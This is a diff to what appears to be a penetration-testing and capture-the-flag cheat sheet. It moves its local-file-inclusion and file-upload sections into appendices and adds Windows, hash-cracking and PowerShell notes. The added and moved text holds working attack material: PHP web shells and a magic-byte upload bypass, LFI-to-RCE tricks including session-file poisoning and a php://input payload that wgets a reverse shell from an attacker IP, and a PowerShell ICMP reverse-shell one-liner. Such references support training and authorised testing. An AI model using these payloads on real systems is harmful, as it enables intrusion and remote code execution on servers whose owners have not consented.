@@ -396,197 +396,6 @@ Examples:
  "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
  "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
-LFI : Reading a php file
-^^^^^^^^^^^^^^^^^^^^^^^^
-
-If a website is affected by a LFI, we could use php filter to read the source code of a PHP File
-
-:: 
-
-  http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
-
-More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_
-
-To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applications/uniscan>`_ Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. 
-
-::
-
-  uniscan -h
-  OPTIONS:
-    -h  help
-    -u  <url> example: https://www.example.com/
-    -f  <file> list of url's
-    -b  Uniscan go to background
-    -q  Enable Directory checks
-    -w  Enable File checks
-    -e  Enable robots.txt and sitemap.xml check
-    -d  Enable Dynamic checks
-    -s  Enable Static checks
-    -r  Enable Stress checks
-    -i  <dork> Bing search
-    -o  <dork> Google search
-    -g  Web fingerprint
-    -j  Server fingerprint
-
-  usage:
-  [1] perl ./uniscan.pl -u http://www.example.com/ -qweds
-  [2] perl ./uniscan.pl -f sites.txt -bqweds
-  [3] perl ./uniscan.pl -i uniscan
-  [4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
-  [5] perl ./uniscan.pl -o "inurl:test"
-  [6] perl ./uniscan.pl -u https://www.example.com/ -r
-
-There's another tool called `fimap <https://tools.kali.org/web-applications/fimap>`_. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.
-
-.. Note :: Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
-
-**Filtering in LFI**
-
-Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly. 
-
-For example: the below code only includes the file which are named secret
-::
-
- <?php
-   $file = @$_GET['filname'];
-   if(strlen($file) > 55)
-      exit("File name too long.");
-   $fileName = basename($file);
-   if(!strpos($file, "secret"))
-     exit("No secret is selected.");
-   echo "<pre>";
-   include($file);
-   echo "</pre>";
- ?>
-
-
-
-File Upload
-^^^^^^^^^^^
-Let's see few examples of File Upload
-
-* Simple File Upload - Intercepting the request in Burp/ ZAP and changing the file-extension.
-
- Below is the PHP code
-
- ::
-
-  <?  
-
-  function genRandomString() { 
-    $length = 10; 
-    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
-    $string = "";     
-
-    for ($p = 0; $p < $length; $p++) { 
-        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
-    } 
-
-    return $string; 
-  } 
-
-  function makeRandomPath($dir, $ext) { 
-    do { 
-    $path = $dir."/".genRandomString().".".$ext; 
-    } while(file_exists($path)); 
-    return $path; 
-  } 
-
-  function makeRandomPathFromFilename($dir, $fn) { 
-    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
-    return makeRandomPath($dir, $ext); 
-  } 
-
-  if(array_key_exists("filename", $_POST)) { 
-    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
-
-
-        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
-        echo "File is too big"; 
-    } else { 
-        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
-            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
-        } else{ 
-            echo "There was an error uploading the file, please try again!"; 
-        } 
-    } 
-  } else { 
-  ?> 
-  <form enctype="multipart/form-data" action="index.php" method="POST">  
-  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
-  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />  
-  Choose a JPEG to upload (max 1KB):<br/>  
-  <input name="uploadedfile" type="file" /><br />  
-  <input type="submit" value="Upload File" />  
-  </form>  
-  <? } ?>   
-
- If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.
-
- * Create a fake JPG containing php code.
-
-  We’ll be using system() to read our password.
-
-  ::
-
-   echo "<?php system($_GET["cmd"]); ?>" > shell.jpg  
-
- * Upload JPG, intercept in Burp/ ZAP and change the extension
-
-  ::
-
-   <input name="filename" value="o0xn5q93si.jpg" type="hidden">  
-
-  is changed to
-
-  ::
-
-  <input name="filename" value="o0xn5q93si.php" type="hidden">  
-
-* Simple File Upload - With verifying image type
-
- In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded
-
- ::
-
-  <?php  
-  ...  
-  
-  else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
-        echo "File is not an image";  
-    }  
-  
-  ...  
-  
-  ?> 
-
- Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a "Magic Number" at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
-
- * Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let's say first 100 bytes)
-
-  ::
-
-   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
-
-   -n length         : Interpret only length bytes of Input
-   -e format_string  : Specify a format string to be used for displaying data
-
-  Example:
- 
-  ::
-
-   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
-   \xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
-  
- * Create a file with JPG header and command shell code using python
-
-  ::
-
-   >>> fh = open('shell.php','w')  
-   >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
-   >>> fh.close()   
-
-.. Tip :: Do check the source code of the page for any client-side file validation or any commented hidden parameters?
 
 Reverse Shells
 --------------
@@ -1186,6 +995,70 @@ If we are getting the below error on running local exploits of getuid in meterpr
  [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.
 
 Possibly, migrate into a new process using post/windows/manage/migrate
+
+ICMP Shell
+^^^^^^^^^^
+
+Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use `Simple reverse ICMP Shell <https://github.com/inquisb/icmpsh>`_ However, this requires the executable to be present on the system. There's a powershell version of `ICMP Reverse Shell <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1>`_ Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.
+
+::
+
+ powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"
+
+
+The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won't be displayed!). Now, there's a painful way of transferring files to the victim system which is
+
+* Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the uncessesary code/ comments, this would help us to reduce the length of the base64)
+* Utilize the `Add-Content cmdlet <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1>`_ to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.
+ 
+ ::
+  
+  Add-Content <filename> "Base64 encoded content"
+
+* Once the base64-encoded data is transferred, we can utilize `certutil <https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx>`_ from Microsoft to decode the base64-encoded to normal file.
+
+ ::
+
+  certutil <-decode/ -encode> <input file> <output file>
+  -decode Decode a Base64-encoded file
+  -encode Encode a file to Base64
+
+* Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer managment so, we would be able to get full output of the commands.
+
+* Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let's say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.
+
+ ::
+
+  $username = 'UsernameHere';
+  $password = 'PasswordHere';
+  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 
+
+* Once, we have created a PSCredential, we can use `Invoke-Command <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command>`_  to execute command as that user.
+
+  ::
+   
+   Invoke-Command -ComputerName localhost -PSCredential $credential -ScriptBlock {Command to be executed}
+   -ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn't work.
+
+* Possibly, we can execute the ICMP Shell code to get the shell as the new user.
+
+* One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user. 
+  
+  * Check powershell processes with Show-Process
+
+   ::
+
+    Show-Process -Name *power* "
+  
+  *  Note down  the PID 
+  * Execute shell as the different user 
+  * Stop-Process the previous PID
+
+
+
+
+
 
 Privilege escalation from g0tm1lk blog
 --------------------------------------
@@ -1842,6 +1715,8 @@ First things
 * View Source of the web-page (Ctrl+U).
 * Inspect element of the web-page (F12).
 * See if there is any hint in the title of the web page. (example: /Magic).
+* Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!
+* Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.
 * If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
 
 htaccess - UserAgent
@@ -2097,6 +1972,43 @@ We can get the password hash of a password protected rar file by using rar2john
     file name: artwork.jpg
     crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
 
+keepass2john
+^^^^^^^^^^^^
+
+::
+
+ keepass2john user.kdbx 
+ user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+
+::
+
+ john --wordlist wordlist --format=keepass hashfile
+
+There are other \*2john thingy
+
+::
+
+ dmg2john
+ gpg2john
+ hccap2john
+ keepass2john
+ keychain2john
+ keyring2john
+ keystore2john
+ kwallet2john
+ luks2john
+ pfx2john
+ putty2john
+ pwsafe2john
+ racf2john
+ rar2john
+ ssh2john
+ truecrypt_volume2john
+ uaf2john
+ wpapcap2john
+ zip2john
+
+
 Encrypted Files
 ---------------
 
@@ -2144,6 +2056,77 @@ and Veracrypt or cryptsetup to open the file.
 ::
 
   cryptsetup open --type tcrypt <Truecrypt> <MountName>
+
+Windows
+-------
+
+Get-ChildItem Mode Values
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+'Mode' values returned by PowerShell's Get-ChildItem cmdlet?
+
+::
+
+ PS> gci|select mode,attributes -u
+
+ Mode                Attributes
+ ----                ----------
+ d-----               Directory
+ d-r---     ReadOnly, Directory
+ d----l Directory, ReparsePoint
+ -a----                 Archive
+
+In any case, the full list is:
+
+::
+
+ d - Directory
+ a - Archive
+ r - Read-only
+ h - Hidden
+ s - System
+ l - Reparse point, symlink, etc.
+
+Zip or unzip using ONLY Windows' built-in capabilities? 
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Powershell way
+
+::
+
+ Add-Type -A System.IO.Compression.FileSystem
+ [IO.Compression.ZipFile]::CreateFromDirectory('foo', 'foo.zip')
+ [IO.Compression.ZipFile]::ExtractToDirectory('foo.zip', 'bar')
+
+Alternate Data Stream
+^^^^^^^^^^^^^^^^^^^^^
+Sometimes, `Alternate Data Stream <https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/>`_ can be used to hide data in streams.
+
+The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).
+::
+
+ PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *
+
+ Filename: C:\Users\Administrator\example.zip
+
+ Stream             Length
+ ------             -------
+ :$DATA             8
+ pass.txt           4
+
+Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.
+
+::
+
+ Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
+ The password is Passw0rd!
+
+Check a directory for ADS?
+
+::
+
+ gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
+
 
 
 Others
@@ -2346,10 +2329,16 @@ Others
 
  * Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text for. 
    
-   Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down. Taken from <https://g0blin.co.uk/droopy-vulnhub-writeup/>
+   Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from `Droopy Vulnhub WriteUp <https://g0blin.co.uk/droopy-vulnhub-writeup/>`_
    Drupal settings file location: /var/www/html/sites/default/settings.php
+ 
+ * WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
 
 * If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.
+
+* Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running http:\\IP\panel should provide us valid extensions.
+
+* Sharepoint running? Probably, check `SPartan <https://github.com/sensepost/SPartan>`_ Frontpage and Sharepoint fingerprinting and attack tool and `SharePwn <https://github.com/0rigen/SharePwn>`_ SharePoint Security Auditor.
 
 * Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.
 
@@ -2426,7 +2415,14 @@ Others
     more ~/text.txt
     exit 0
 
-  In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell 
+  In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.
+
+ * List all the files together
+
+  ::
+
+   find /home -type f -printf "%f\t%p\t%u\%g\t%m\n" 2>/dev/null | column -t
+ 
 
 Cyber-Deception
 ===============
@@ -2480,5 +2476,377 @@ Useful Tools
 * `exe2hex <https://github.com/g0tmi1k/exe2hex>`_ : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell). 
 
 * `Powercat <https://github.com/secabstraction/PowerCat>`_ : A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
+
+Appendix-I : Local File Inclusion
+=================================
+
+Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.
+
+Tools
+-----
+
+To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applications/uniscan>`_ Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. 
+
+::
+
+  uniscan -h
+  OPTIONS:
+    -h  help
+    -u  <url> example: https://www.example.com/
+    -f  <file> list of url's
+    -b  Uniscan go to background
+    -q  Enable Directory checks
+    -w  Enable File checks
+    -e  Enable robots.txt and sitemap.xml check
+    -d  Enable Dynamic checks
+    -s  Enable Static checks
+    -r  Enable Stress checks
+    -i  <dork> Bing search
+    -o  <dork> Google search
+    -g  Web fingerprint
+    -j  Server fingerprint
+
+  usage:
+  [1] perl ./uniscan.pl -u http://www.example.com/ -qweds
+  [2] perl ./uniscan.pl -f sites.txt -bqweds
+  [3] perl ./uniscan.pl -i uniscan
+  [4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
+  [5] perl ./uniscan.pl -o "inurl:test"
+  [6] perl ./uniscan.pl -u https://www.example.com/ -r
+
+There's another tool called `fimap <https://tools.kali.org/web-applications/fimap>`_. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.
+
+.. Note :: Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
+
+Filtering in LFI
+^^^^^^^^^^^^^^^^
+
+Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly. 
+
+For example: the below code only includes the file which are named secret
+::
+
+ <?php
+   $file = @$_GET['filname'];
+   if(strlen($file) > 55)
+      exit("File name too long.");
+   $fileName = basename($file);
+   if(!strpos($file, "secret"))
+     exit("No secret is selected.");
+   echo "<pre>";
+   include($file);
+   echo "</pre>";
+ ?>
+
+LFI to Remote Code Execution
+----------------------------
+
+Mainly taken from `LFI-Cheat-Sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_ , `Exploiting PHP File Inclusion – Overview <https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/>`_ and `Upgrade from LFI to RCE via PHP Sessions <https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/>`_
+
+There are variety of different tricks to turn your LFI into RCE. Using 
+
+File upload forms/ functions
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.
+
+PHP wrapper expect://command
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.
+
+An example of PHP expect:
+
+::
+
+ http://IP/fileincl/example1.php?page=expect://ls
+
+If PHP expect wrapper is disabled, below error is encountered.
+
+::
+
+ Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 
+ Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 
+ Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 
+ Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
+
+PHP wrapper php://file
+^^^^^^^^^^^^^^^^^^^^^^
+PHP wrapper php://filter
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.
+
+The output is encoded using base64, so you’ll need to decode the output.
+
+::
+
+ http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+or
+
+We could use php filter to read the source code of a PHP File
+
+:: 
+
+  http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
+
+More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_
+
+PHP input:// stream
+^^^^^^^^^^^^^^^^^^^
+
+php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.
+
+Send your payload in the POST request using curl, burp.
+
+Example:
+
+::
+
+ http://IP/fileincl/example1.php?page=php://input
+
+
+Post Data payload:
+
+::
+
+  <? system('wget http://IP/php-reverse-shell.php -O /var/www/shell.php');?>
+
+After uploading execute the reverse shell at 
+
+::
+
+ http://IP/shell.php
+
+data://text/plain;base64,command
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+/proc/self/environ
+^^^^^^^^^^^^^^^^^^
+
+If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.
+
+/proc/self/fd
+^^^^^^^^^^^^^
+
+If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.
+
+This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc. 
+Utilize `LFI-LogFileCheck.txt <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt>`_ with Burp Intruder, and check for the returned page sizes.
+
+Control over PHP Session Values
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Let's say, a vulnerable page is present with the post request
+
+::
+
+ POST /upload/? HTTP/1.1
+ Host: vulnerable.redacted.com
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Content-Type: application/x-www-form-urlencoded
+ Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+ Content-Length: 44
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+ 
+ login=1&user=admin&pass=admin&lang=en_us.php
+
+with LFI
+
+::
+
+ login=1&user=admin&pass=admin&lang=../../../../../../../../../../etc/passwd
+
+Now, the server store cookies
+
+::
+
+ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+ Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+ Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+
+As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+
+Now, we can write the cookie with a php command
+
+::
+
+ POST /upload/? HTTP/1.1
+ Host: vulnerable.redacted.com
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Content-Type: application/x-www-form-urlencoded
+ Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+ Content-Length: 134
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+
+ login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+
+This would result in 
+
+::
+
+ Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly
+
+Now, the php command can be executed using
+
+::
+
+ POST /upload/? HTTP/1.1
+ Host: vulnerable.redacted.com
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 141
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+
+ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+
+The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)
+
+Email Server 
+^^^^^^^^^^^^
+
+
+Appendix-II File Upload
+=======================
+
+Examples
+--------
+
+Simple File Upload
+^^^^^^^^^^^^^^^^^^
+
+Intercepting the request in Burp/ ZAP and changing the file-extension.
+
+Below is the PHP code
+
+::
+
+  <?  
+
+  function genRandomString() { 
+    $length = 10; 
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
+    $string = "";     
+
+    for ($p = 0; $p < $length; $p++) { 
+        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
+    } 
+
+    return $string; 
+  } 
+
+  function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir."/".genRandomString().".".$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+  } 
+
+  function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+  } 
+
+  if(array_key_exists("filename", $_POST)) { 
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
+        echo "File is too big"; 
+    } else { 
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
+        } else{ 
+            echo "There was an error uploading the file, please try again!"; 
+        } 
+    } 
+  } else { 
+  ?> 
+  <form enctype="multipart/form-data" action="index.php" method="POST">  
+  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
+  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />  
+  Choose a JPEG to upload (max 1KB):<br/>  
+  <input name="uploadedfile" type="file" /><br />  
+  <input type="submit" value="Upload File" />  
+  </form>  
+  <? } ?>   
+
+If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.
+
+* Create a fake JPG containing php code.
+
+  We’ll be using system() to read our password.
+
+ ::
+
+   echo "<?php system($_GET["cmd"]); ?>" > shell.jpg  
+
+* Upload JPG, intercept in Burp/ ZAP and change the extension
+
+ ::
+
+   <input name="filename" value="o0xn5q93si.jpg" type="hidden">  
+
+  is changed to
+
+ ::
+
+  <input name="filename" value="o0xn5q93si.php" type="hidden">  
+
+Simple File Upload - With verifying image type
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded
+
+::
+
+  <?php  
+  ...  
+  
+  else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
+        echo "File is not an image";  
+    }  
+  
+  ...  
+  
+  ?> 
+
+Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a "Magic Number" at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
+
+* Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let's say first 100 bytes)
+
+ ::
+
+   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
+
+   -n length         : Interpret only length bytes of Input
+   -e format_string  : Specify a format string to be used for displaying data
+
+ Example:
+ 
+ ::
+
+   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
+   \xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
+  
+* Create a file with JPG header and command shell code using python
+
+  ::
+
+   >>> fh = open('shell.php','w')  
+   >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
+   >>> fh.close()   
+
